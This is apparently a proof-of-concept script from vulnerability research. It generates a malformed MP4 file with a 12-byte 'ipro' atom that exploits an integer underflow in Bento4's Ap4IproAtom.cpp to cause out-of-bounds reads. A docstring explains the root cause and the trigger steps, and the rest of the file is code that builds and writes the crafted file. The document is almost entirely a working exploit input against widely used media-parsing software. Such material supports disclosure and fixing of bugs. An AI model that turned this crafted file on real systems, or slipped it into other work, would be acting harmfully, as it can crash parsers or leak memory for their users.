#!/usr/bin/env python3
"""
PoC Generator for VULN 001:
  Integer Underflow in bytes_available → Out-of-Bounds Read
  File: Bento4/Source/C++/Core/Ap4IproAtom.cpp
  Function: AP4_IproAtom::AP4_IproAtom()
  CWE-191 → CWE-125

Root cause:
  AP4_IproAtom::Create() checks size < 12 (AP4_FULL_ATOM_HEADER_SIZE).
  size=12 PASSES (12 is not < 12).
  Constructor then computes:
    bytes_available = size - AP4_FULL_ATOM_HEADER_SIZE - 2
                    = 12 - 12 - 2
                    = 0xFFFFFFFE  (AP4_UI32 unsigned underflow)
  This huge value is zero-extended to AP4_LargeSize (uint64), becoming ~4 GB.
  It is then passed to CreateAtomFromStream(), making boundary checks ineffective,
  allowing the parser to read sub-atoms from OUTSIDE the ipro atom's declared bounds.

Trigger:
  1. ipro size=12 → passes Create() check
  2. ReadFullHeader reads version+flags → stream at ipro+12 (end of declared ipro)
  3. ReadUI16(entry_count) reads 2 bytes PAST ipro boundary (OOB read #1)
  4. bytes_available = 0xFFFFFFFE
  5. Loop entry_count times: CreateAtomFromStream(stream, 0xFFFFFFFE, atom)
     → reads sub-atoms from outside ipro's boundary (OOB read #2+)

MP4 structure:
  ftyp (20 bytes)
  moov:
    mvhd (108 bytes)
    udta:
      ipro (size=12) ← vulnerable atom
      [entry_count bytes: 0x0001 → 1 iteration]
      [fake sub-atom: size=8, type='free']
  mdat (8 bytes)

Additionally, a second variant places ipro as the LAST atom in the file so that
ReadUI16(entry_count) reads exactly 2 bytes PAST EOF, maximising ASAN detection.
"""

import struct
import os
import sys

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp"
OUTPUT_FILE = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(type_tag, payload):
    """Return a box: 4-byte big-endian size + 4-byte type + payload."""
    if isinstance(type_tag, str):
        type_tag = type_tag.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + type_tag + payload


def make_full_box(type_tag, version, flags, payload):
    """Return a FullBox: box header + version(1) + flags(3) + payload."""
    ver_flags = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return make_box(type_tag, ver_flags + payload)


def build_ftyp():
    """ftyp: major_brand=mp42, minor_version=0, compatible=[mp42, isom]."""
    payload = b'mp42'
    payload += struct.pack('>I', 0)   # minor_version
    payload += b'mp42'                # compatible brand 1
    payload += b'isom'                # compatible brand 2
    return make_box('ftyp', payload)


def build_mvhd():
    """mvhd version 0: 108 bytes total."""
    payload = b''
    payload += struct.pack('>II', 0, 0)         # creation/modification time
    payload += struct.pack('>I', 1000)           # timescale
    payload += struct.pack('>I', 0)              # duration
    payload += struct.pack('>I', 0x00010000)     # rate  (1.0)
    payload += struct.pack('>H', 0x0100)         # volume (1.0)
    payload += b'\x00' * 10                      # reserved
    # 3x3 identity matrix
    payload += struct.pack('>IIIIIIIII',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b'\x00' * 24                      # pre_defined
    payload += struct.pack('>I', 1)              # next_track_ID
    return make_full_box('mvhd', 0, 0, payload)  # 8+4+96 = 108 bytes


def build_ipro_size12():
    """
    Craft the vulnerable ipro atom with size=12.

    Layout (12 bytes):
      [0-3]  size  = 0x0000000C (12)
      [4-7]  type  = 'ipro'
      [8-11] version(1B)=0, flags(3B)=0  ← this is the full atom header

    size=12 passes the Create() guard (12 < 12 is false).
    After ReadFullHeader() consumes bytes [8-11], the stream is positioned
    exactly AT the atom end.  The constructor then calls ReadUI16(entry_count)
    which reads 2 bytes BEYOND the atom's declared boundary.
    """
    # size(4) + type(4) + version+flags(4) = 12 bytes exactly
    data = struct.pack('>I', 12)   # size field = 12
    data += b'ipro'                # type
    data += struct.pack('>I', 0)   # version=0, flags=0  (AP4_FULL_ATOM_HEADER_SIZE consumed)
    assert len(data) == 12
    return data


def build_udta_with_vuln_ipro():
    """
    udta container holding the vulnerable ipro plus carefully placed
    subsequent bytes that will be read by the ipro constructor as:
      - entry_count  (2 bytes at udta-content offset 12-13)
      - sub-atom header  (8 bytes at udta-content offset 14-21)

    These bytes lie outside ipro's declared 12-byte boundary but inside udta.
    The ipro constructor reads them as part of its own parsing (OOB read).
    """
    ipro = build_ipro_size12()               # 12 bytes
    assert len(ipro) == 12

    # These 2 bytes are read by ReadUI16(entry_count) from PAST ipro's end.
    # entry_count=1 causes the loop to call CreateAtomFromStream once
    # with bytes_available=0xFFFFFFFE, demonstrating the boundary bypass.
    entry_count_bytes = struct.pack('>H', 1)  # 0x00, 0x01

    # Fake sub-atom: size=8, type='free' (just a header, no payload).
    # CreateAtomFromStream will accept it because 8 <= 0xFFFFFFFE.
    fake_subatom = struct.pack('>I', 8) + b'free'

    udta_content = ipro + entry_count_bytes + fake_subatom
    # Total udta content: 12 + 2 + 8 = 22 bytes

    return make_box('udta', udta_content)


def build_moov():
    """moov: mvhd + udta(ipro[size=12] + OOB bytes)."""
    mvhd = build_mvhd()             # 108 bytes
    udta = build_udta_with_vuln_ipro()
    return make_box('moov', mvhd + udta)


def build_mdat():
    """Minimal empty mdat."""
    return make_box('mdat', b'')


def main():
    os.makedirs(POC_DIR, exist_ok=True)

    data = b''
    data += build_ftyp()
    data += build_moov()
    data += build_mdat()

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(data)

    total = len(data)
    print(f"[+] PoC written: {OUTPUT_FILE}")
    print(f"[+] File size: {total} bytes")
    print()
    print("[+] Vulnerability trigger:")
    print("    ipro.size = 12  (passes 'size < 12' guard in Create())")
    print("    bytes_available = 12 - 12 - 2 = 0xFFFFFFFE  (AP4_UI32 underflow)")
    print("    ReadUI16(entry_count) reads 2 bytes OUTSIDE ipro boundary")
    print("    entry_count=1 → CreateAtomFromStream(stream, 0xFFFFFFFE, atom)")
    print("    Sub-atom 'free'(size=8) parsed outside ipro's declared bounds")


if __name__ == '__main__':
    main()
